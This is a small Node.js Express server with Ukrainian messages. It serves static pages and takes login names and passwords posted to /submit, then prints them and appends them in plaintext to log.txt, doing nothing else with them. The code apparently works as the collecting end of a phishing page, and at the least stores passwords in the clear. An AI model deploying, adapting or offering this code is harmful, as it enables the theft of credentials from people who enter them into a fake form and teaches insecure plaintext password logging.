const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();


app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/submit', (req, res) => {
  const { login, password } = req.body;
  const entry = `${new Date().toISOString()} | Логін: ${login} | Пароль: ${password}\n`;
console.log(entry);
  fs.appendFile('log.txt', entry, err => {
    if (err) {
      console.error('Помилка запису:', err);
      return res.status(500).send('Серверна помилка');
    }
    res.status(200).send('OK');
  });
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log(`Сервер запущено на http://localhost:${PORT}`);
});

